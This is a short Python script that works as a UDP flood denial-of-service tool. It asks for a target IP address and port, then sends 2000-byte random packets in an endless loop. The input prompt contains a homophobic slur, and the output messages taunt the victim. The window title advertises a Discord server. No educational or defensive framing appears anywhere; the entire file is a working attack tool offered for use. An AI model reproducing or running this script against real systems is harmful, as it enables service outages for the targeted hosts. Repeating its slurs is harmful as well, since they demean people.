import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)
os.system("cls")


os.system('title .gg/comrades')

ip = input("\033[1;32m enter the fags ip  : ")
port = int(input("\033[1;32m port  : "))
time.sleep(5)
os.system("cls")
print("\033[1;35m attack starts in 4 seconds\n")

time.sleep(4)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 2
    port = port
    print("\033[1;92m u just fucked up %s on port:%s" % (ip, port))